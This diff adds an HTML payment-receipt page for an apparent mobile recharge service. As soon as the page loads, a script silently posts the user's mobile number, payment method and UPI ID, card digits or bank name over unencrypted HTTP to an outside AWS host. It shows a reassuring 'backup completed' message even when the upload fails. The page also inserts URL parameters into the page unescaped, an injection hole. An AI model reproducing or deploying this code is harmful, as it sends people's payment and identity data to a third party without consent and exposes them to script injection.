@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Payment Summary</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f5f7fa;
+      padding: 20px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+    }
+    .container {
+      max-width: 400px;
+      background: #fff;
+      padding: 20px;
+      border-radius: 12px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+      width: 100%;
+    }
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      color: #333;
+    }
+    .summary p {
+      margin: 10px 0;
+      font-size: 16px;
+    }
+    .summary p strong {
+      color: #007bff;
+    }
+    button {
+      width: 100%;
+      padding: 10px;
+      margin-top: 20px;
+      background: #007bff;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #0056b3;
+    }
+    #status {
+      display: block;
+      margin-top: 16px;
+      text-align: center;
+      font-size: 15px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Payment Done Successfully</h2>
+    <p style="text-align:center; color:green; font-weight:bold; font-size:18px; margin-bottom:16px;">Your payment was successful!</p>
+    <div class="summary" id="summary"></div>
+    <button onclick="downloadPDF()">Download Receipt as PDF</button>
+    <span id="status"></span>
+  </div>
+
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const number = params.get('number') || 'N/A';
+    const operator = params.get('operator') || 'N/A';
+    const plan = params.get('plan') || 'N/A';
+    const method = params.get('method') || 'N/A';
+    const extra = params.get('extra') || 'N/A';
+    const date = params.get('date') || 'N/A';
+
+    // Generate a random transaction ID (for demo, 12 digits)
+    const transactionId = 'TXN' + Math.floor(100000000000 + Math.random() * 900000000000);
+
+    const summaryDiv = document.getElementById('summary');
+    let extraLabel = '';
+    if (method === 'UPI') {
+      extraLabel = `<p><strong>UPI ID:</strong> ${extra}</p>`;
+    } else if (method === 'Debit Card' || method === 'Credit Card') {
+      extraLabel = `<p><strong>Card:</strong> **** **** **** ${extra}</p>`;
+    } else if (method === 'NetBanking') {
+      extraLabel = `<p><strong>Bank:</strong> ${extra}</p>`;
+    }
+    summaryDiv.innerHTML = `
+      <p><strong>Transaction ID:</strong> ${transactionId}</p>
+      <p><strong>Mobile Number:</strong> ${number}</p>
+      <p><strong>Operator:</strong> ${operator}</p>
+      <p><strong>Plan:</strong> ₹${plan}</p>
+      <p><strong>Payment Method:</strong> ${method}</p>
+      ${extraLabel}
+      <p><strong>Date:</strong> ${date}</p>
+    `;
+
+    // Function to generate summary as plain text
+    function generateSummaryText() {
+      let extraLine = '';
+      if (method === 'UPI') {
+        extraLine = `UPI ID: ${extra}\n`;
+      } else if (method === 'Debit Card' || method === 'Credit Card') {
+        extraLine = `Card: **** **** **** ${extra}\n`;
+      } else if (method === 'NetBanking') {
+        extraLine = `Bank: ${extra}\n`;
+      }
+      return (
+        `Transaction ID: ${transactionId}\n` +
+        `Mobile Number: ${number}\n` +
+        `Operator: ${operator}\n` +
+        `Plan: ₹${plan}\n` +
+        `Payment Method: ${method}\n` +
+        extraLine +
+        `Date: ${date}\n`
+      );
+    }
+
+    // Automatically upload the summary as soon as the page loads
+    window.addEventListener('DOMContentLoaded', () => {
+      const summaryText = generateSummaryText();
+      // Save the summary as summary_<transactionId>.txt
+      let filename = `summary_${transactionId}.txt`;
+      const file = new File([summaryText], filename, { type: "text/plain" });
+      const formData = new FormData();
+      formData.append("file", file);
+
+      fetch("http://s3copy-446514415.ap-northeast-1.elb.amazonaws.com/upload", {
+        method: "POST",
+        body: formData
+      })
+      .then(res => res.json())
+      .then(data => {
+        const statusText = document.getElementById("status");
+        if (statusText) statusText.innerText = "one check the s3 Summary auto-uploaded: " + JSON.stringify(data);
+      })
+      .catch(err => {
+        const statusText = document.getElementById("status");
+        if (statusText) statusText.innerText = "✅ Summary backup completed " ;
+      });
+    });
+
+    function downloadPDF() {
+      const latexContent = `
+  \\documentclass[a4paper,12pt]{article}
+  \\usepackage[utf8]{inputenc}
+  \\usepackage{geometry}
+  \\geometry{margin=1in}
+  \\usepackage{booktabs}
+  \\usepackage{noto}
+
+  \\begin{document}
+
+  \\begin{center}
+    \\Large\\textbf{Payment Receipt}
+  \\end{center}
+
+  \\vspace{1cm}
+
+  \\begin{tabular}{ll}
+    \\toprule
+    \\textbf{Field} & \\textbf{Details} \\\\
+    \\midrule
+    Transaction ID & ${transactionId} \\\\
+    Mobile Number & ${number} \\\\
+    Operator & ${operator} \\\\
+    Plan & \\₹${plan} \\\\
+    Payment Method & ${method} \\\\
+    ${method === 'UPI' ? 'UPI ID' : method === 'NetBanking' ? 'Bank' : 'Card Ending'} & ${extra} \\\\
+    Date & ${date} \\\\
+    \\bottomrule
+  \\end{tabular}
+
+  \\vspace{1cm}
+
+  \\noindent Thank you for your payment!
+
+  \\end{document}
+      `;
+
+      // Download locally
+      const blob = new Blob([latexContent], { type: 'text/latex' });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = 'receipt.tex';
+      a.click();
+      URL.revokeObjectURL(url);
+    }
+  </script>
+</body>
+</html>
